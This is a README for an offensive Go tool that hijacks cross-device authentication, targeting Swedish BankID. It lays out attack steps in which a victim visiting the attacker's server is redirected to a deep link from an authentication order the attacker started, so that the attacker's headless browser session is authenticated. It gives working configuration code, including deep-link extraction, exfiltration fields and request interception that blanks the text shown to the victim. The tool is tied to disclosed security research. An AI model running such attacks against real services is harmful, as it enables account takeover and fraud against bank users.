# Cross Device Authentication Tesing Tool

This tool was created to be able to easily test flaws in different cross device authentication protocols. Services relying on qr-codes and deep-links to authenticate remote or local browser sessions using their own mobile app are becoming increasingly popular, but testing their security can be quite difficult.

This tool relies on a headless browser to test for a simple attack that allows an attacker to start an authentication order against a service, extract or generate a deep link which will trick the victim's application to authenticate the remote session all on the fly as the victim is visiting our web server.

## Usage

Currently only one attack is available for use, slowly as other vulnerabilities get disclosed publicly more will be added. 

The attack available is to test Swedish BankID configurations, related to the research that can be found [here](https://mastersplinter.work/bankid)

This tool requires:
- `go >= 1.21.6` 
- `chromium` or `google-chrome` and the respective headless driver

After installing those dependencies the tool can be run with `go run .`.

## Attack steps

1. The victim visits the exposed web server hosted on port 8080 (victim can also be taken directly to step 2)
2. The victim clicks on the path hosting the attack
3. The headless browser goes to the target service and starts an authentication order
4. The deep-link is extracted/generated from the authentication order
5. The victim is redirected to the deep-link
    - Via server redirection straight to the deep link
    - To a secondary page that triggers the deep link with js and then navigates to the legitimate service website
6. After the victim authenticates on the service's mobile app our headless browser session will instead be authenticated

## Creating a new attack

While the tool might move towards configuration files to set these up, currently they are defined directly in the Golang code.

### Attack Type

An attack type is defined for each different IdP you are targeting, while the attack itself might differ service to service, the attack type is supposed to the define general parameters for the "family" of attacks:

```go
var BankIDAttack AttackType = AttackType{
	Name:      "bankid",
	Regex:     `(bankid:\/\/\/)?\?autostarttoken=[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}&redirect=\w+`,
	Prefix:    "bankid:///",
	ReturnArg: "redirect",
}
```

- `Name`: Name for this type of attack
- `Regex`: Regex for the deep-link to be extracted
- `Prefix`: Prefix for the deep-link
- `ReturnArg`: Some IdPs like to redirect back to a webpage after auth using a parameter, set the name of such parameter if you want to try and hijack such a flow to find an open redirect

All of these parameters except `Name` are optional.

### Attack 

After defining your attack type you will now be able to use it to define an attack:

```go
type Attack struct {
	Url                 string                                                          // Main Url to visit
	RedirectURL         string                                                          // URL to redirect victim to (for higher impact)
	Actions             []chromedp.Action                                               // Actions of the headless browser
	CustomExtraction    func(string, string) string                                     // Custom action to extract the deep link
	RequestInterception func(ev *fetch.EventRequestPaused) *fetch.ContinueRequestParams // Action to modify request to get deep link
	Path                string                                                          // Path to host attack on
	Fixed               bool                                                            // Attack is fixed
	Type                AttackType                                                      // Type of attack
	CustomBrowserFlags  []chromedp.ExecAllocatorOption                                  // Custom flags to pass to the headless browser
	ExfiltrationSteps   []chromedp.Action                                               // Headless browsers steps to be taken to exfiltrate data (not required)
	ExfilArea           string                                                          // XPath for text to extract out of the page after exfiltration steps
}
```

Here is an example:

```go
{
    Url:  "https://www.bankid.com/demo",
    Path: "/bankid-demo",
    Actions: []chromedp.Action{
        chromedp.Sleep(1 * time.Second),
        chromedp.WaitVisible("/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]", chromedp.BySearch),
        chromedp.Click("/html/body/div/div[2]/div[1]/div[1]/div[1]/div/a[1]", chromedp.BySearch),
        chromedp.WaitVisible("/html/body/div/div[2]/div[1]/div[1]/div/div[2]/a", chromedp.BySearch),
        chromedp.Click("/html/body/div/div[2]/div[1]/div[1]/div/div[2]/a", chromedp.BySearch),
    },
    RedirectURL: "https://www.bankid.com/demo",
    Type:        BankIDAttack,
    ExfilArea:   `/html/body/div/div[2]/div[1]/div[1]/div/div[2]/div[2]/div[1]`,
    // Removing the test markdown text
    RequestInterception: func(ev *fetch.EventRequestPaused) *fetch.ContinueRequestParams {
        var fetchRequest *fetch.ContinueRequestParams
        if strings.Contains(ev.Request.URL, "/demo/api/authentication") {
            r, _ := base64.StdEncoding.DecodeString((ev.Request.PostDataEntries[0].Bytes))
            re := regexp.MustCompile(`"userVisibleData":"[^"]*"`)
            noDeviceData := re.ReplaceAllString(string(r), `"userVisibleData":""`)
            fetchRequest = fetch.ContinueRequest(ev.RequestID).WithPostData(base64.StdEncoding.EncodeToString([]byte(noDeviceData)))
        } else {
            fetchRequest = fetch.ContinueRequest(ev.RequestID)
        }
        return fetchRequest
    },
},
```

As shown the tool heavily relies on the `chromedp`, I recommend reading up on their docs and their examples to see the full extent of its capabilities [here](https://github.com/chromedp/chromedp).

Hopefully as more attacks get released here they will be sufficient to draw inspiration from.